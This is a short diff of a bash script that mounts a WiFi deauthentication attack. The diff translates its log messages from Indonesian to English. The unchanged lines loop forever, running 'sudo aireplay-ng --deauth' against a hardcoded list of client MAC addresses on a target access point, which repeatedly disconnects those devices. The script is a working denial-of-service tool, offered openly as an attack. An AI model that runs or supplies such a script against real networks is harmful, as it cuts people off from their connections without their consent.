@@ -11,11 +11,11 @@ CLIENTS=(
     "6A:B1:E1:D5:77:A5"
 )
 
-echo "[*] Mulai serangan deauth ke ${#CLIENTS[@]} klien..."
+echo "[*] Start Deauth Attack to Client ${#CLIENTS[@]} ..."
 
 while true; do
     for CLIENT in "${CLIENTS[@]}"; do
-        echo ">> Menyerang $CLIENT"
+        echo ">> Attack $CLIENT"
         sudo aireplay-ng --deauth $DEAUTH_COUNT -a $BSSID -c $CLIENT $INTERFACE --ignore-negative-one
         sleep 1
     done
